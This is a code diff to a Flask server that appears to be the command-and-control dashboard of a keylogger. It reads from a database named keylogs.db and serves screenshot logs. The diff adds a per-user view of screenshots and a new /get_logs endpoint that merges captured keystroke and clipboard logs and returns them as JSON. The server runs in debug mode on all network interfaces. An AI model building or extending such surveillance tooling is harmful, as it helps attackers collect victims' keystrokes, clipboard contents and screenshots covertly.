@@ -1,11 +1,6 @@
-# server.py
-
 from flask import Flask, render_template, g, send_from_directory, request, jsonify
 import sqlite3
 import os
-import subprocess
-import requests
-
 
 app = Flask(__name__)
 DB_FILE = "./db/keylogs.db"
@@ -108,8 +103,11 @@ def dashboard():
 
 @app.route("/screenshots")
 def screenshots():
+    unique_users = get_unique_users()
     screenshots = get_screenshot_logs()
-    return render_template("screenshot.html", screenshots=screenshots)
+    return render_template(
+        "screenshot.html", screenshots=screenshots, unique_users=unique_users
+    )
 
 
 @app.route("/screenshots/<path:filename>")
@@ -135,6 +133,16 @@ def testing():
     )
 
 
-if __name__ == "__main__":
+@app.route("/get_logs", methods=["GET"])
+def get_logs():
+    user_logs = get_user_logs()
+    clipboard_logs = get_clipboard_logs()
+    all_logs = user_logs + clipboard_logs
+    all_logs = sorted(
+        all_logs, key=lambda k: k["timestamp"], reverse=True
+    )  # Sort logs by timestamp
+    return jsonify(all_logs)
 
+
+if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080, debug=True)
